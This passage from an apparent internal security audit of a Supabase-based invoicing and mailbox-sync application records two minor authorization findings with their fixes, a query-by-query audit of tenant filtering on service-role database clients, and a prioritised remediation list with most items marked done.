`user_id`/`status`/`shared`/`is_system` unsettable by the client); the 4 public routes
(`pay/[token]`, `invite/info`, `cron/email-sync`, `tools/scan-invoice`) each carry their own gate.
Two non-catastrophic items:
- **🟠 AZ1 OAuth `state` unsigned/trusted** — SECOND independent confirmation of MH1 (§3):
  `email/callback/{gmail,outlook}` fall back to `stateData.userId` with no signature/nonce →
  mailbox-connection CSRF. Not account takeover (pollutes a victim with the attacker's mail).
  Fix: HMAC-sign or server-nonce the state; require a matching session.
- **🟡 AZ2 notification spam** — `messages/route.ts:79-87` writes a notification to a body-supplied
  `receiver_id` via service-role; pin it to a real conversation partner.

## 8g. Tenant boundary in the mailbox pipeline (CLEAN — September 2026)

Asked before pointing Gmail/Outlook sync at real customers. `createPipelineClient()` is
**service_role: it bypasses RLS entirely**, so in `src/lib/email-integration.ts` every filter IS the
boundary — there is no second net behind it. Five pipeline clients are bound in that file
(`supabase`, `insertPipeline`, `skipPipeline`, `wmPipeline`, `opruimen`).

Every table query on one of them, counted and then read by hand:

| | count |
|---|---|
| table queries on a service-role client | 43 |
| carrying an explicit tenant filter (`user_id` / `receiver_id` / `sender_id`) | 35 |
| addressed by primary `id` | 8 |
| **carrying neither** | **0** |

The eight by-`id` calls are the only ones that need an argument rather than a grep, and each was
traced to the read that produced the id:

- `email_connections` delete on `other.id` — `others` is `.eq('user_id', userId)` (provider switch);
- `email_connections` update on `row.id` — `row` is `.eq('user_id', userId).eq('provider', …)`;
- `profiles` select on `.eq('id', userId)` — the id *is* the tenant;
- `email_connections` watermark read **and** write on `tokens.connectionId` — `getEmailTokens()`
  selects `.eq('user_id', userId)`, so the connection id cannot be another owner's;
- `suppliers` iban read on `supplier.id` — `suppliers` is per-owner
  (`user_id NOT NULL REFERENCES profiles(id)`), and every read in `supplier-registry.ts` that
  produces an id carries `.eq('user_id', userId)`; every insert carries `user_id: userId`;
- two `documents` writes on `documentId` — the row this same call inserted moments earlier.

**Storage was checked separately and is already gated.** All eight `storage.from('documents')` calls
in the file are either a key this code built itself (`${userId}/incoming/…`) or passed through
`ownedStoragePath(path, userId)` first — the distinction `[SEC-STORAGE-PATH]` draws, and the gate of
that name walks every service-role byte-op in `src/` and enforces it.

**No gate was added for the table half, deliberately.** The storage rule is one uniform invariant
(a path key carries its owner in its first segment), which is why it can be a prohibition with no
exception list. The table rule is not uniform: the tenant column differs per table
(`user_id`, `receiver_id`, `zzper_id`, `accountant_id`, `client_id`) and one route computes it at
runtime (`direction === 'incoming' ? 'receiver_id' : 'sender_id'`). A first repo-wide scan reported
132 violations, and widening the column list dissolved essentially all of them — a gate at that
signal-to-noise is a snapshot that goes stale, not a net. The eight justified by-`id` calls in this
one file would themselves need an eight-entry allowlist, which is the same objection.

So this section is the record instead: **audited, clean, and the reasoning for each exception is
above so the next reader does not have to re-derive it.**

## 9. Recommended fix order

1. ~~**C1** (xlsx upgrade) + **H2** (bound the sheet range) — a tiny authenticated upload crashes/corrupts the shared server today.~~
   **H2 done; C1 contained** (July 2026 — prototype-pollution impact neutralised, ReDoS bounded).
   **Still to do: the one-command SheetJS upgrade** (see C1) — it is the only thing that actually fixes CVE-2024-22363.
2. ~~**H1** (CSV `csvCell` in export.ts/account-export)~~ — **done + tested** (July 2026).
3. ~~**MH1** (OAuth state nonce)~~ — **done** (HttpOnly nonce cookie, `oauth-state.ts`).
4. ~~**H3/M4** (CAMT `isFinite` + date-shape guards)~~ — **done**.
5. ~~**M1/M2/M3** (email size cap, email-HTML escape, QR CR/LF strip)~~ — **done**; M3 now has 25 regression tests.
6. **A1/A3** — compliance + audit (deletion purge, version the remaining prod-only DB objects). **← now the top remaining item after the C1 upgrade.**
